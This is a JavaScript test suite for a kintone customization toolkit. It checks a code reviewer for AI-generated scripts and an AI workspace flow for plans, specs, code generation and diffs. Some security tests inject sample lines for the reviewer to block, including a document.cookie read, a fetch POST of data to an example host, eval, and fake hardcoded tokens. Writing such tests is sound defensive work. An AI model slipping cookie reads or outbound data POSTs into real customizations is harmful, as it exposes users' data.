  assert(errorAndValue.status === 'BLOCKED' && check(errorAndValue, 'error-cancels-edit') && !check(errorAndValue, 'error-cancels-edit').ok && /value/.test(check(errorAndValue, 'error-cancels-edit').message), 'Phase 20: 同じ change イベントで error と value（approver）を設定: kintone が値の変更を取り消すので BLOCKED（error-cancels-edit）');
  const extraApi = run(NEW_JS_GOOD.replace("    return event;", "    kintone.api(kintone.api.url('/k/v1/records.json', true), 'GET', { app: 600 });\n    return event;"));
  assert(extraApi.status === 'REVIEW_REQUIRED' && check(extraApi, 'apis-network') && !check(extraApi, 'apis-network').ok && /kintone\.api/.test(check(extraApi, 'apis-network').message), '計画に無い REST API（kintone.api）: 確認が必要（単純な制御には不要）');
  const missingEv = run(NEW_JS_GOOD.replace("['app.record.create.change.amount', 'app.record.edit.change.amount']", "'app.record.create.change.amount'"));
  // Phase 20（実機 BF-C 4 回目）: 計画の change を登録しないコードは入力中に切り替わらない → 軽微な差ではなく要確認に変更
  assert(missingEv.mismatches.some(m => m.code === 'MISSING_EVENT' && m.items.includes('app.record.edit.change.amount')) && !check(missingEv, 'planned-events').ok && check(missingEv, 'planned-events').severity === 'block' && /入力中に切り替わりません/.test(check(missingEv, 'planned-events').message) && missingEv.status === 'BLOCKED' && missingEv.registration.verdict === 'BLOCKED', '計画のイベントがコードに無い: 登録不可（Phase 21。change が無いと入力中に切り替わらない。以前は確認が必要の扱い）');
  const extraEv = run(NEW_JS_GOOD.replace("['app.record.create.change.amount', 'app.record.edit.change.amount']", "['app.record.create.change.amount', 'app.record.edit.change.amount', 'app.record.detail.show']"));
  assert(extraEv.status === 'REVIEW_REQUIRED' && extraEv.mismatches.some(m => m.code === 'EXTRA_EVENT'), '計画に無いイベントの登録: 計画との不一致（確認が必要）');
  const dangerous = run(NEW_JS_GOOD.replace("    return event;", "    eval('1 + 1');\n    return event;"));
  assert(dangerous.status === 'BLOCKED' && !check(dangerous, 'security').ok && /eval/i.test(check(dangerous, 'security').message), '危険 API（eval）: BLOCKED');
  const secret = run(NEW_JS_GOOD.replace("    return event;", "    const h = { Authorization: 'Bearer abcdefghijklmnop1234567890' };\n    return event;"));
  assert(secret.status === 'BLOCKED' && !check(secret, 'security').ok, 'ハードコードされた Authorization: BLOCKED');
  const token = run(NEW_JS_GOOD.replace("    return event;", "    const API_TOKEN = 'sk_live_0123456789abcdefABCDEF';\n    return event;"));
  assert(token.status === 'BLOCKED' && !check(token, 'security').ok, 'ハードコードされた token: BLOCKED');
  const ext = run(NEW_JS_GOOD.replace("    return event;", "    fetch('https://api.example.com/notify', { method: 'POST', body: JSON.stringify({ amount: amount }) });\n    return event;"));
  assert(ext.status === 'BLOCKED' && !check(ext, 'security').ok && /外部|example\.com|POST/i.test(check(ext, 'security').message), '外部への POST: BLOCKED（既定で外部通信は禁止）');
  const cookie = run(NEW_JS_GOOD.replace("    return event;", "    const ck = document.cookie;\n    return event;"));
  assert(cookie.status === 'BLOCKED' && !check(cookie, 'security').ok, 'document.cookie: BLOCKED');
  const globals = run("const EVENTS = ['app.record.create.change.amount', 'app.record.edit.change.amount'];\nkintone.events.on(EVENTS, function (event) { event.record['amount'].error = null; return event; });");
  assert(globals.status === 'REVIEW_REQUIRED' && !check(globals, 'globals').ok, '即時関数で包まない（グローバル汚染）: 確認が必要');
  const noReturn = run(NEW_JS_GOOD.replace("    return event;\n", ""));
  assert(noReturn.status === 'REVIEW_REQUIRED' && !check(noReturn, 'return-event').ok, 'return event が無い handler: 確認が必要');
  // 実機（Scenario C）: 名前付き関数を handler に渡す形（kintone.events.on(EVENTS, checkAmount)）でも return event を本体から判定する
  const NAMED = [
    "(function () {",
    "  'use strict';",
    "  const EVENTS = ['app.record.create.change.amount', 'app.record.edit.change.amount'];",
    "  function checkAmount(event) {",
    "    const record = event.record;",
    "    record['amount'].error = Number(record['amount'].value || 0) >= 1000000 ? '100万円以上です' : null;",
    "    return event;",
    "  }",
    "  kintone.events.on(EVENTS, checkAmount);",
    "})();",
  ].join('\n');
  const named = run(NAMED);
  assert(check(named, 'return-event')?.ok && check(named, 'events')?.ok && named.status === 'OK', `名前付き関数の handler: 定義の本体で return event を判定（${check(named, 'return-event')?.message}）`);
  const namedArrow = run(NAMED.replace("  function checkAmount(event) {", "  const checkAmount = (event) => {").replace("    return event;\n  }", "    return event;\n  };"));
  assert(check(namedArrow, 'return-event')?.ok, 'アロー関数を const に入れた handler も同様');
  const namedNoReturn = run(NAMED.replace("    return event;\n", ""));
  assert(!check(namedNoReturn, 'return-event').ok, '名前付き関数に return event が無ければ指摘する');
  const dup = run(NEW_JS_GOOD.replace("})();", "  kintone.events.on('app.record.create.change.amount', function (event) { return event; });\n})();"));
  assert(!check(dup, 'duplicate-handler').ok, '同じイベントを 2 回登録: 確認が必要');
  const awaitBad = run(NEW_JS_GOOD.replace("    return event;", "    await Promise.resolve();\n    return event;"));
  assert(awaitBad.status === 'BLOCKED', 'async でない handler の await: BLOCKED（構文エラー）');
  const empty = run('   ');
  assert(empty.status === 'BLOCKED' && check(empty, 'code') && !check(empty, 'code').ok, '空のコード: BLOCKED');
  // patch の失敗
  const hy = reviewPlan(PLAN_HYBRID);
  const runP = (patch, src = SRC) => KTCodeReview.review({ generated: genPatch(patch), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: src });
  const anchorBad = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: '    // not in source', content: PATCH_ADDED }] });
  assert(anchorBad.status === 'BLOCKED' && !check(anchorBad, 'patch').ok && check(anchorBad, 'patch').detail?.code === 'PATCH_ANCHOR_NOT_FOUND', 'anchor が既存ソースに無い: BLOCKED（全文の書き換えに逃げない）');
  const anchorAmb = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: "record[", content: PATCH_ADDED }] });
  assert(anchorAmb.status === 'BLOCKED' && check(anchorAmb, 'patch').detail?.code === 'PATCH_ANCHOR_AMBIGUOUS', 'anchor が複数回現れる（"record["）: BLOCKED（一意な anchor が必要）');
  const anchorLine = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: "    const record = event.record;", content: PATCH_ADDED }] });
  assert(anchorLine.status === 'OK' && anchorLine.diff.added === 3 && anchorLine.diff.removed === 0, '一意な行を anchor にした INSERT_AFTER: 適用できる（OK）');
  const hashBad = runP({ baseHash: 'deadbeef', operations: PATCH_GOOD.operations });
  assert(hashBad.status === 'BLOCKED' && check(hashBad, 'patch').detail?.code === 'PATCH_BASE_MISMATCH', 'baseHash が現在の本文と違う（既存ファイルが変わった）: BLOCKED');
  const noSrc = runP(PATCH_GOOD, null);
  assert(noSrc.status === 'BLOCKED' && /JS_SOURCE_UNAVAILABLE/.test(check(noSrc, 'patch').message), '統合先の本文が無い: BLOCKED（JS_SOURCE_UNAVAILABLE）');
  const replace = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'REPLACE', anchor: "    if (record['ステータス'].value === '承認待ち') {", content: "    if (record['ステータス'] && (record['ステータス'].value === '承認待ち' || record['ステータス'].value === '完了')) {" }] });
  assert(replace.status === 'REVIEW_REQUIRED' && check(replace, 'patch-removal') && !check(replace, 'patch-removal').ok && replace.diff.removed === 1 && replace.diff.added === 1, 'REPLACE で既存行を置き換える: 既存処理が失われないか確認（確認が必要）');
  const emptyPatch = runP({ baseHash: hash(FIELD_ON_OFF), operations: [] });
  assert(emptyPatch.status === 'BLOCKED', '操作の無い patch: BLOCKED');
  const otherStrategy = KTCodeReview.review({ generated: genNew(NEW_JS_GOOD, { strategy: 'PLUGIN_CANDIDATE' }), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan });
  assert(otherStrategy.status === 'BLOCKED' && check(otherStrategy, 'strategy') && !check(otherStrategy, 'strategy').ok, 'PLUGIN_CANDIDATE 等はコード生成の対象外: BLOCKED');
  // 既存 JS との競合（統合先以外）
  const conflict = KTCodeReview.review({ generated: genNew(), customization: NEW_JS_CUST(), plan: PLAN_NEW_JS.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: null });
  assert(conflict.status === 'REVIEW_REQUIRED' && !check(conflict, 'existing-conflict').ok && /fieldOnOff\.js/.test(check(conflict, 'existing-conflict').message), '新規 JS が既存 fieldOnOff.js と同じ amount を制御: JS_FIELD_CONFLICT（確認が必要）');
  // 実機（Phase 17 E2E C）: モバイル JS への統合（patch。追加分に handler なし）では、PC の既存 JS は競合にならず、platform は最終ファイルのイベントで判定する
  const MOBILE_LOCK_SRC = ['(function () {', "  'use strict';", "  kintone.events.on('mobile.app.record.edit.show', function (event) {", "    event.record['owner'].disabled = true;", '    return event;', '  });', '})();'].join(String.fromCharCode(10));
  const mobCust = { customizationId: 'C1', requirement: '承認待ちは金額も編集不可', strategy: 'EXTEND_EXISTING_JS', platform: ['mobile'], events: ['mobile.app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], existingFiles: [{ name: 'mobileLock.js', target: 'mobile' }] };
  const mobPatch = { baseHash: hash(MOBILE_LOCK_SRC), operations: [{ type: 'INSERT_AFTER', anchor: "    event.record['owner'].disabled = true;", content: ["    if (event.record['ステータス'].value === '承認待ち') {", "      event.record['amount'].disabled = true;", '    }'].join(String.fromCharCode(10)) }] };
  const mobRv = KTCodeReview.review({ generated: { strategy: 'EXTEND_EXISTING_JS', targetFile: 'mobileLock.js', summary: 'm', code: mobPatch.operations[0].content, patch: mobPatch, events: ['mobile.app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [] }, customization: mobCust, plan: PLAN_HYBRID.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: { name: 'mobileLock.js', target: 'mobile', text: MOBILE_LOCK_SRC } });
  assert(mobRv.status === 'OK' && check(mobRv, 'existing-conflict').ok && check(mobRv, 'platform').ok, `モバイル JS への統合: PC の fieldOnOff.js は競合にならず、platform は最終ファイルの mobile イベントで整合（${(mobRv.checks || []).filter(c => !c.ok).map(c => c.name).join(',') || 'すべて ✓'}）`);
  // platform
  const mobilePlan = KTCodeReview.review({ generated: genNew(), customization: { ...NEW_JS_CUST(), platform: ['desktop', 'mobile'] }, plan: PLAN_NEW_JS.plan, data: INPUTS_PLAIN.data, scan: INPUTS_PLAIN.scan });
  assert(!check(mobilePlan, 'platform').ok, '計画はモバイルも対象なのに mobile.* のイベントが無い: 確認が必要');
}

// =========================================================
console.log('\n--- §53. AI Workspace: Hybrid の計画 → カード → コード生成 → Code Review → Diff / コピー ---');
const HEALTH = { ok: true, supportedContractVersions: ['2.0', '2.1'], entitlements: [{ product: 'toolkit', features: ['assistant-qa', 'change-planner', 'customization-generator'] }], registry: { toolkit: { 'assistant-qa': { implemented: true, promptVersions: ['1'] }, 'change-planner': { implemented: true, promptVersions: ['1'] }, 'customization-generator': { implemented: true, promptVersions: ['1'] } } }, usage: { monthlyLimit: 20, usedThisMonth: 1 } };
const HEALTH_NO_GEN = { ...HEALTH, entitlements: [{ product: 'toolkit', features: ['assistant-qa', 'change-planner'] }] };
const makeStorage = () => { const m = new Map(); return { getItem: (k) => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)), removeItem: (k) => m.delete(k) }; };
const answerFor = (ctx, text) => ({ ok: true, contractVersion: '2.1', meta: { requestId: 'qa-1', usage: { usedThisMonth: 2, monthlyLimit: 20 }, normalization: { warnings: [] } }, answer: text, facts: [], analysis: [], recommendations: [], unknowns: [] });
function mount({ inputs = INPUTS, planResponse = PLAN_HYBRID, generatedFor = null, health = HEALTH, loadJsSource = undefined, rescanJs = undefined, generateError = null } = {}) {
  const storage = makeStorage();
  const settings = KTAiClient.createSettingsStore({ storage, host: 't.cybozu.com' });
  settings.setConsent(true);
  const calls = { ask: [], plan: [], generate: [], health: 0 };
  const client = {
    async getHealth() { calls.health++; return health; },
    async ask({ ctx, requestId, signal }) {
      calls.ask.push({ ctx, requestId, signal });
      const text = ctx.planContext ? 'C1 は、承認後の金額ロックがフィールドのアクセス権では表現できないため JavaScript になっています。' : 'このフィールドは金額です。';
      const v = KTAiClient.validateAnswer(answerFor(ctx, text), ctx);
      return { ...v.normalized, requestId: v.normalized.requestId || requestId, clientWarnings: v.warnings };
    },
    async plan({ ctx, requestId, signal }) {
      calls.plan.push({ ctx, requestId, signal });
      const resp = typeof planResponse === 'function' ? planResponse(ctx) : planResponse;
      const v = KTAiClient.validatePlan(resp, ctx);
      return { ...v.normalized, requestId, clientWarnings: v.warnings };
    },
    async generate({ ctx, requestId, signal }) {
      calls.generate.push({ ctx, requestId, signal });
      if (generateError) throw generateError;
      const g = generatedFor ? generatedFor(ctx) : (ctx.customization.strategy === 'EXTEND_EXISTING_JS' ? genPatch({ ...PATCH_GOOD, baseHash: ctx.existingFile?.hash || PATCH_GOOD.baseHash }) : genNew());
      const v = KTAiClient.validateGenerated(genResponse(ctx, g), ctx);
      if (!v.ok) throw new KTAiClient.AiClientError({ code: v.errors[0].code, message: v.errors[0].message, requestId });
      return { ...v.normalized, requestId, clientWarnings: v.warnings };
    },
  };
  const session = { status() { return { connected: true, apiBase: 'https://gw.test', refreshExpiresAt: '2099-01-01T00:00:00Z', scope: { product: 'toolkit', feature: 'assistant-qa,change-planner,customization-generator', domain: 't.cybozu.com' } }; }, async migrateLegacy() { return false; }, async refresh() { return {}; }, async disconnect() { return { revoked: true }; }, client };
  const flow = { start: async () => ({}), cancel() { }, reopen: () => false, state: () => ({ phase: 'idle' }), isRunning: () => false };
  const host = makeFakeHost();
  const copies = [], downloads = [];
  const mock = makeKintoneMock(inputs.data);
  const panel = mountAiWorkspace(host, {
    getInputs: () => inputs, copyText: async (t) => { copies.push(t); return true; }, downloadText: (name, text) => downloads.push({ name, text }), colors: { border: '#ccc', bg: '#fff' },
    settings, session, hostname: 't.cybozu.com', connectFlow: flow,
    executor: { api: mock.api, appId: '310' },
    ...(loadJsSource ? { loadJsSource } : {}), ...(rescanJs ? { rescanJs } : {}),
  });
  const $ = (id) => host.querySelector(`#${id}`);
  return { host, panel, $, calls, copies, downloads, mock, conv: () => panel.conversation(), chat: () => $('kt-ai-chat').innerHTML, msgs: () => panel.conversation().state.messages, types: () => panel.conversation().state.messages.map(m => m.type) };
}
const clickChat = (m, act, extra = {}) => m.$('kt-ai-chat').dispatch({ type: 'click', target: { dataset: { act, ...extra } } });
/** 2026-10-06: 会話に見える文（タグと data 属性を除く）。内部の番号（C1・v1 など）が出ていないことを確かめる */
const textOf = (html) => String(html).replace(/<[^>]*>/g, '');
/** Phase 17: 実装仕様の確定（Human Approval の SoT は仕様カードの［この仕様で確定］）。仕様が無い（JS のない）計画では何もしない */
const confirmSpec = async (m) => { const v = m.conv().activePlan(); if (v?.spec) await clickChat(m, 'confirm-spec', { plan: v.planId, version: String(v.version) }); };
const writes = (m) => m.mock.calls.filter(c => !c.startsWith('GET'));
{
  const m = mount();
  await ticks();
  const r = await m.panel.send(GOAL_HYBRID);
  assert(r && r.ok && r.intent === KTAiConversation.INTENT.PLAN && m.calls.plan.length === 1, 'Hybrid の goal → PLAN（Planner を 1 回呼ぶ）');
  const v = m.conv().activePlan();
  assert(v && v.plan.solution === 'HYBRID' && v.plan.customizations.length === 1 && v.review && v.review.hybrid.solution === 'HYBRID', '計画の版: solution HYBRID・customizations 1・Toolkit Review に hybrid');
  const html = m.chat();
  // 2026-10-06: 会話の変更案のカードは 1 枚（標準設定と JavaScript を組み合わせる計画である旨・設定の変更と JavaScript の件数）。内訳は右の「変更内容」の要約（対象）と「確認結果」
  assert(/変わる内容：設定の変更 1 件・JavaScript 1 件/.test(html) && /標準設定と JavaScript を組み合わせる計画です/.test(html) && /対象：一覧／JavaScript（PC：編集画面）/.test(m.$('kt-ai-change-summary').innerHTML), '変更案のカード: 標準設定と JavaScript を組み合わせる計画である旨と、設定の変更 1 件・JavaScript 1 件。右の「変更内容」の要約に対象（一覧／JavaScript の画面）');
  // Phase 19: カスタマイズの詳細（統合先・イベント・フィールド・不足する理由）は右の「変更内容」の実装仕様カードだけ。会話は要約（要件と統合先・PC / モバイル）
  const specPane = m.$('kt-ai-spec').innerHTML;
  assert(!/kt-ai-customization-card/.test(html) && /・承認後（完了）は金額を編集できなくする（fieldOnOff\.js を変更・PC）/.test(html) && !/app\.record\.edit\.show/.test(html) && !/amount（CONTROL）/.test(html) && /kt-ai-spec-card/.test(specPane) && /✎ fieldOnOff\.js を変更/.test(specPane) && /標準で不足/.test(specPane) && /app\.record\.edit\.show/.test(specPane) && /amount（CONTROL）/.test(specPane), '実装仕様カード（右の「変更内容」）: ✎ fieldOnOff.js を変更・イベント・フィールド（access）・不足する理由。会話は要件と統合先の要約だけ（イベント・フィールドの内訳は出さない）');
  assert(!/C1|v1/.test(textOf(html)), '会話の変更案・実装の内容のカードに内部の番号（C1・版の v1）を出さない');
  const reviewPane = m.$('kt-ai-review-result').innerHTML;
  assert(/data-act="generate" data-cid="C1"/.test(reviewPane) && /コードを作る/.test(reviewPane) && !/data-act="generate"/.test(html), '［コードを作る］は右の「確認結果」の JS の判定（会話には無い）');
  // 2026-10-06: Toolkit の確認（REVIEW）のカードは会話に出さない（conv.messages には残る）。結果は変更案のカードの「Toolkit の確認：…」、件数は右の「確認結果」
  const reviewMsg = m.msgs().find(x => x.type === 'REVIEW');
  assert(reviewMsg && KTAiChatUi.isHiddenMessage(reviewMsg) && !/kt-ai-review-card/.test(html) && /Toolkit の確認：問題は見つかりませんでした。/.test(html) && /実行可能な標準設定: 1 件　コード生成可能: 1 件/.test(reviewPane), 'Toolkit の確認: 会話はカードを出さず変更案のカードの 1 行だけ（REVIEW は記録に残る）。標準設定 1 件・JavaScript のコード生成可能 1 件は右の「確認結果」で別に数える');
  assert(/kt-ai-review-hybrid/.test(reviewPane) && /実装計画（標準設定 ＋ JavaScript）/.test(reviewPane) && /コード生成可能: 1 件/.test(reviewPane) && !/kt-ai-review-hybrid/.test(m.$('kt-ai-plan-result').innerHTML), 'Toolkit で確認した結果（右の「確認結果」）: Hybrid Review ブロック（標準設定 / JavaScript / 全体）。変更内容のペインには無い');
  assert(/登録済み JS/.test(m.$('kt-ai-header').innerHTML) && /fieldOnOff\.js/.test(m.$('kt-ai-header').innerHTML), 'ヘッダー詳細: 登録済み JS（既存カスタマイズ設定）');
  // 「これで進めて」はコードを作らない
  const pv = await m.panel.send('これで進めて');
  assert(pv.intent === KTAiConversation.INTENT.REQUEST_PREVIEW && m.calls.generate.length === 0 && /JavaScript 1 件は標準設定の反映とは別に登録します/.test(m.chat()), '「これで進めて」: REQUEST_PREVIEW。コードは生成しない・JS は標準設定の反映とは別に登録する旨');
  // 説明（EXPLAIN_CUSTOMIZATION）
  const ex = await m.panel.send('C1 はなぜ JavaScript が必要？');
  assert(ex.intent === KTAiConversation.INTENT.EXPLAIN_CUSTOMIZATION && m.calls.ask.length === 1 && m.calls.ask[0].ctx.planContext?.kind === 'EXPLAIN_PLAN' && /JavaScript カスタマイズの説明/.test(m.chat()), 'EXPLAIN_CUSTOMIZATION: planContext（EXPLAIN_PLAN）で説明だけ。計画は変えない');
  assert(m.conv().activePlan() === v && m.calls.plan.length === 1 && m.calls.generate.length === 0, '説明では Planner / Generator を呼ばない');
  // Phase 17: 仕様の確定前はコードを作らない（spec-required）。チャットの「それでいい」でも確定しない。確定は仕様カードの［この仕様で確定］だけ
  assert(v.spec && v.spec.status === 'DRAFT' && m.types().includes('SPEC') && /JavaScript の実装の内容をまとめました。/.test(m.chat()) && !/実装仕様 v1/.test(m.chat()) && /data-act="open-spec"[^>]*>内容を見る</.test(m.chat()) && !/data-act="confirm-spec"/.test(m.chat()) && /data-act="confirm-spec"/.test(m.$('kt-ai-spec').innerHTML) && /data-act="revise-spec"/.test(m.$('kt-ai-spec').innerHTML), '計画に JS があれば実装仕様 v1（DRAFT）: 会話は「JavaScript の実装の内容をまとめました。」の要約（版の番号は出さない・［内容を見る］）、［仕様を修正］［この仕様で確定］は右の「変更内容」だけ（Human Approval の SoT は右）');
  const g0 = await m.panel.send('コードを作って');
  assert(g0.ok === false && m.calls.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'spec-required'), '仕様の確定前の「コードを作って」: Generator を呼ばず、確定を案内');
  const c0 = await m.panel.send('それでいい');
  assert(c0.intent === KTAiConversation.INTENT.CONFIRM_SPEC && v.spec.status === 'DRAFT' && /この仕様で確定］ボタン/.test(m.chat()), '「それでいい」は CONFIRM_SPEC（案内だけ。仕様は DRAFT のまま）');
  await confirmSpec(m);
  assert(v.spec.status === 'CONFIRMED' && v.spec.customizeRevision === '12' && m.msgs().some(x => x.data?.kind === 'spec-confirmed') && /確定済み/.test(m.chat()) && /JavaScript の実装の内容を確定しました。/.test(m.chat()) && /JavaScript を生成（C1）/.test(m.$('kt-ai-spec').innerHTML) && m.panel.activeArtifact()?.type === 'CUSTOMIZATION_SPEC', '［この仕様で確定］→ CONFIRMED・動作テスト環境の customize revision（12）を記録・会話は「確定しました」・右の「変更内容」に［JavaScript を生成（C1）］');
  // コード生成
  const g = await m.panel.send('コードを作って');
  assert(g && g.ok && g.intent === KTAiConversation.INTENT.GENERATE_CODE && m.calls.generate.length === 1, '「コードを作って」→ GENERATE_CODE → Generator を 1 回呼ぶ');
  const gctx = m.calls.generate[0].ctx;
  assert(gctx.contextVersion === 'customization-1' && gctx.customization.customizationId === 'C1' && gctx.existingFile?.name === 'fieldOnOff.js' && gctx.existingFile.source === FIELD_ON_OFF && gctx.facts === undefined, 'Generator Context: C1 ＋ 統合先の本文（解析結果から）。アプリ全体の facts なし');
  const entry = m.panel.generated('C1');
  assert(entry && entry.generated.strategy === 'EXTEND_EXISTING_JS' && entry.review.status === 'OK' && entry.existingSource?.text === FIELD_ON_OFF, '生成結果を版に保持: Toolkit Code Review OK');
  assert(m.types().includes('CODE') && /JavaScript を作りました。/.test(m.chat()) && /コードの確認：/.test(m.chat()) && /✓ 検査を通過/.test(m.chat()) && /登録できるか：✓/.test(m.chat()) && /✎ <b>fieldOnOff\.js<\/b>（PC）/.test(m.chat()) && !/✓ Patch/.test(m.chat()) && !/Toolkit Code Review/.test(m.chat()), 'コードカード（§7）: ファイル名と「コードの確認：✓ 検査を通過」「登録できるか」だけ（検査の内訳・内部の処理名は会話に無い）');
  assert(/data-act="open-code" data-cid="C1" data-view="code"[^>]*>コードを見る</.test(m.chat()) && /data-act="open-code" data-cid="C1" data-view="diff"[^>]*>差分を見る</.test(m.chat()) && m.host.innerHTML.includes('id="kt-ai-code-copy"') && m.host.innerHTML.includes('id="kt-ai-diff-copy"') && /差分をコピー/.test(m.host.innerHTML) && /変更前後（差分）/.test(m.host.innerHTML), 'コードカードの操作: コードを見る / 差分を見る。コピー（コードをコピー / 差分をコピー）と変更前後（差分）は右の「コード」');
  assert(/＋3 \/ −0 行/.test(m.chat()) && m.panel.drawerState().pane === 'code' && /元のコードは保持/.test(m.$('kt-ai-code-review').innerHTML) && /✓ 既存ファイルへの統合/.test(m.$('kt-ai-code-review').innerHTML), 'Diff の要約: 会話は ＋3 / −0 行。生成後は右の「コード」が自動で開き（§13）、検査の内訳（既存ファイルへの統合 / 元のコードは保持）はそこに');
  assert(/登録は右の「コード」の［動作テスト環境へ登録］→ 右の「反映」の確認の順/.test(m.chat()) && /運用環境には反映しません/.test(m.chat()) && m.$('kt-ai-code-register').style.display === '' && m.$('kt-ai-code-register').disabled === false, 'コードカード: 登録は右の「コード」の［動作テスト環境へ登録］→ 右の「反映」の確認の順（運用環境には反映しない）。登録ボタンは右に（反映を止める理由が無いので押せる）');
  assert(writes(m).length === 0, 'コード生成で kintone への書き込みは 0 件');
  // コードを見る / Diff
  await clickChat(m, 'open-code', { cid: 'C1', view: 'code' });
  assert(m.panel.drawerState().open && m.panel.drawerState().pane === 'code' && m.$('kt-ai-code-view').textContent === entry.review.finalCode && m.$('kt-ai-code-view').style.display === '' && m.$('kt-ai-diff-view').style.display === 'none', '［コードを見る］→ コードペインに最終コード');
  assert(/✎ 既存 JS を変更/.test(m.$('kt-ai-code-head').innerHTML) && /既存ファイルへの統合/.test(m.$('kt-ai-code-review').innerHTML) && /安全性/.test(m.$('kt-ai-code-review').innerHTML) && !/Patch|Security/.test(m.$('kt-ai-code-review').innerHTML), 'コードペイン: 見出しと Code Review の一覧（検査名は日本語）');
  await clickChat(m, 'open-code', { cid: 'C1', view: 'diff' });
  assert(m.$('kt-ai-diff-view').style.display === '' && /^\+\s*if \(record\['ステータス'\] && record\['ステータス'\]\.value === '完了'\)/m.test(m.$('kt-ai-diff-view').textContent) && / {0,}kintone\.events\.on/.test(m.$('kt-ai-diff-view').textContent), '［差分を見る］→ Before / After（追加行は +・既存行は保持）');
  // コピー
  await clickChat(m, 'copy-code', { cid: 'C1' });
  assert(m.copies.length === 1 && m.copies[0] === entry.review.finalCode && m.copies[0].includes("value === '完了'") && m.copies[0].startsWith('(function () {'), '［コピー］: 最終コード（既存 ＋ 追加）');
  await clickChat(m, 'copy-diff', { cid: 'C1' });
  assert(m.copies.length === 2 && /^\+/m.test(m.copies[1]), '［差分をコピー］');
  await clickChat(m, 'copy-cplan', { cid: 'C1' });
  const cplan = JSON.parse(m.copies[2]);
  assert(cplan.customization.customizationId === 'C1' && cplan.generated.strategy === 'EXTEND_EXISTING_JS' && cplan.codeReview.status === 'OK' && cplan.provenance.planId === v.planId && cplan.provenance.customizationId === 'C1' && cplan.provenance.requestId, '［Plan JSON］: Customization Plan ＋ 生成要約 ＋ Code Review ＋ 出所（provenance）');
  // コードペインのボタン
  await m.$('kt-ai-pane-code').dispatch({ type: 'click', target: { id: 'kt-ai-code-download' } });
  assert(m.downloads.length === 1 && m.downloads[0].name === 'fieldOnOff.js' && m.downloads[0].text === entry.review.finalCode, 'コードペイン: ファイルとして保存（登録はしない）');
  await m.$('kt-ai-pane-code').dispatch({ type: 'click', target: { id: 'kt-ai-code-copy' } });
  assert(m.copies.length === 4 && m.copies[3] === entry.review.finalCode, 'コードペイン: コードをコピー');
  // Q&A は影響なし
  const qa = await m.panel.send('このフィールドは何に使ってる？');
  assert(qa.intent === KTAiConversation.INTENT.ASK && m.calls.ask.length === 2 && !m.calls.ask[1].ctx.planContext, 'Q&A は影響なし（ASK → assistant-qa。planContext なし）');
  // Preview Executor は JS を反映しない
  m.panel.decide('P1', 'approve'); m.panel.decide('P2', 'approve');
  const rd = m.panel.conversation() && (await m.panel.send('これで進めて'));
  const ready = m.msgs().filter(x => x.data?.kind === 'preview-ready').pop();
  assert(rd.intent === KTAiConversation.INTENT.REQUEST_PREVIEW && ready.data.readiness.executable === 1 && ready.data.readiness.unsupported === 1 && ready.data.readiness.customizations === 1, '承認後の readiness: 実行可 1（P1）・未対応 1（JS の P2）・JS 1');
  // 2026-10-06: 反映の操作は右下の右の「反映」（#kt-ai-pane-exec）。確認事項の無い変更案なので反映は止まらない（applyHold は null）
  assert(m.panel.applyHold() === null && /id="kt-ai-exec-start"/.test(m.$('kt-ai-exec').innerHTML) && !/id="kt-ai-exec-start"[^>]*disabled/.test(m.$('kt-ai-exec').innerHTML), '右の「反映」: 止める理由は無く［動作テスト環境へ反映］を押せる');
  await m.$('kt-ai-pane-exec').dispatch({ type: 'click', target: { id: 'kt-ai-exec-start' } });
  await ticks(8);
  assert(m.panel.executorState().stage === 'confirm', 'Executor: prepare → 最終確認');
  await m.$('kt-ai-pane-exec').dispatch({ type: 'click', target: { id: 'kt-ai-exec-go' } });
  await ticks(12);
  const ex2 = m.panel.executorState().execution;
  assert(ex2 && ex2.status === 'DONE' && ex2.steps.find(s => s.stepId === 'P1')?.status === 'VERIFIED' && ex2.steps.find(s => s.stepId === 'P2')?.status === 'UNSUPPORTED', 'Preview Executor: P1（一覧）は VERIFIED・JS の P2 は UNSUPPORTED（反映しない）');
  assert(writes(m).length > 0 && !writes(m).some(c => /customize/.test(c)), `Executor の書き込みに customize.json（JS 登録）は無い（${writes(m).length} 件）`);
  assert(/反映後の確認：✓ 1 件一致/.test(m.chat()) && !/VERIFIED/.test(textOf(m.chat())), '反映のカード: 「反映後の確認：✓ 1 件一致」（VERIFIED の語は会話に出さない）');
  // 版が変わっても生成結果は版に紐づく
  assert(m.panel.generated('C1') === entry, '生成結果は計画の版に保持されたまま');
}

// =========================================================
console.log('\n--- §53-2. カスタマイズの修正 / 複数カスタマイズの選択 / 生成不可 / BLOCKED なコード ---');
{
  const C2 = cust({ customizationId: 'C2', requirement: '承認済みなら担当者も編集できなくする', fields: [{ code: 'owner', access: 'CONTROL' }] });
  const twoC = planOf({ steps: [STD_STEP(), JS_STEP(), mkStep('P3', 'CUSTOMIZATION_REQUIRED', 'JS', 'fieldOnOff.js', { customizationId: 'C2' }, { title: '承認済みなら担当者も編集不可（JavaScript）', solution: 'CUSTOMIZATION' })], customizations: [cust(), C2], solution: 'HYBRID' });
  const m = mount({ planResponse: (ctx) => (ctx.revision ? planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust({ platform: ['desktop', 'mobile'], events: ['app.record.edit.show', 'mobile.app.record.edit.show'] })], solution: 'HYBRID', requestId: 'pl-h2' }) : twoC) });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  await confirmSpec(m);
  const g0 = await m.panel.send('コードを作って');
  assert(g0.intent === KTAiConversation.INTENT.GENERATE_CODE && m.calls.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'customization-choices' && x.data.choices.length === 2), '複数の生成可能なカスタマイズ: どれか聞く（勝手に生成しない）');
  assert(/data-act="generate" data-cid="C2"/.test(m.chat()), '選択肢のボタン（data-cid）');
  await clickChat(m, 'generate', { cid: 'C2' });
